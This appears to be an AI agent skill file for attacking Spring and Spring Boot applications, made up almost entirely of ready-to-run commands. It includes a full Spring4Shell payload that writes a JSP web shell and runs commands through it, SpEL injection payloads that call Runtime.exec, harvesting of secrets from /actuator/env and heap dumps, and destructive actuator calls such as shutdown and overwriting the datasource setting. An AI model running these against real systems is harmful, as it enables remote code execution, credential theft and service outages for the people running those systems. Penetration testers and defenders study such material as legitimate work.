---
name: framework-spring
description: "Spring/Spring Boot security testing — actuator endpoint exposure (/actuator/env /actuator/heapdump), SpEL injection, Spring4Shell (CVE-2022-22965), Spring Security misconfig, H2 console, Eureka registry. Triggers: 'spring', 'spring boot', 'spring security', 'actuator endpoints', 'spel injection', 'spring4shell', 'java spring', 'actuator heapdump', 'spring actuator'."
---

# Spring / Spring Boot Security Testing

Spring attack surface: actuators, Spring4Shell, SpEL injection, H2 console, Eureka.

## Phase 1: Actuator Discovery

```bash
TARGET="https://TARGET"

for path in /actuator /actuator/env /actuator/health /actuator/info /actuator/metrics \
  /actuator/mappings /actuator/beans /actuator/heapdump /actuator/threaddump \
  /actuator/logfile /actuator/configprops /actuator/conditions /actuator/auditevents \
  /management /management/env /api/actuator /app/actuator; do
  code=$(curl -so /dev/null -w "%{http_code}" "$TARGET$path")
  [ "$code" = "200" ] && echo "EXPOSED: $TARGET$path"
done | tee /workspace/output/actuator-endpoints.txt

curl -s "$TARGET/actuator/env" | python3 -m json.tool | grep -i "password\|secret\|key\|token\|credential" \
  | tee /workspace/output/actuator-env-secrets.txt

curl -s -o /workspace/output/heapdump.hprof "$TARGET/actuator/heapdump"
echo "Heapdump size: $(wc -c < /workspace/output/heapdump.hprof) bytes"

```

## Phase 2: Spring4Shell (CVE-2022-22965)

```bash
curl -s "$TARGET/actuator/info" | python3 -m json.tool | grep -i "spring"

curl -s -X POST "$TARGET/login" \
  -d "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while(-1!%3D(a%3Din.read(b)))%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=" \
  -H "c1: Runtime" -H "c2: <%"  -H "suffix: %>"

curl -s "$TARGET/tomcatwar.jsp?pwd=j&cmd=id"
```

## Phase 3: SpEL Injection

```bash

for payload in '${7*7}' '#{7*7}' 'T(java.lang.Runtime).getRuntime().exec("id")'; do
  curl -s "$TARGET/api/evaluate" \
    -H "Content-Type: application/json" \
    -d "{\"expression\":\"$payload\"}"
done

curl -s "$TARGET/api/calculate/T(java.lang.Runtime).getRuntime().exec('id')"
```

## Phase 4: H2 Console & Eureka

```bash
curl -s "$TARGET/h2-console" -o /workspace/output/h2-console.html
curl -s "$TARGET/h2" -o /tmp/h2.html

curl -s "$TARGET/eureka/apps" | python3 -m json.tool | tee /workspace/output/eureka-services.txt
curl -s "$TARGET:8761/eureka/apps" | python3 -m json.tool

curl -s "$TARGET/admin" -o /workspace/output/spring-admin.html

curl -s "$TARGET/swagger-ui.html" -o /workspace/output/swagger.html
curl -s "$TARGET/v3/api-docs" | python3 -m json.tool
```

## Phase 5: Actuator POST Exploitation

```bash
curl -s -X POST "$TARGET/actuator/loggers/org.springframework.web" \
  -H "Content-Type: application/json" \
  -d '{"configuredLevel":"TRACE"}'

curl -s -X POST "$TARGET/actuator/shutdown"

curl -s -X POST "$TARGET/actuator/refresh"

curl -s -X POST "$TARGET/actuator/env" \
  -H "Content-Type: application/json" \
  -d '{"name":"spring.datasource.url","value":"jdbc:h2:mem:testdb"}'
```

## Output

Save to `/workspace/output/`:
- `actuator-endpoints.txt` — exposed actuator endpoints
- `actuator-env-secrets.txt` — extracted credentials
- `heapdump.hprof` — JVM heap dump
- `eureka-services.txt` — registered microservices

## Next Phase

→ `vuln-rce` for Spring4Shell / SpEL RCE exploitation
→ `vuln-info-disclosure` for actuator secrets analysis
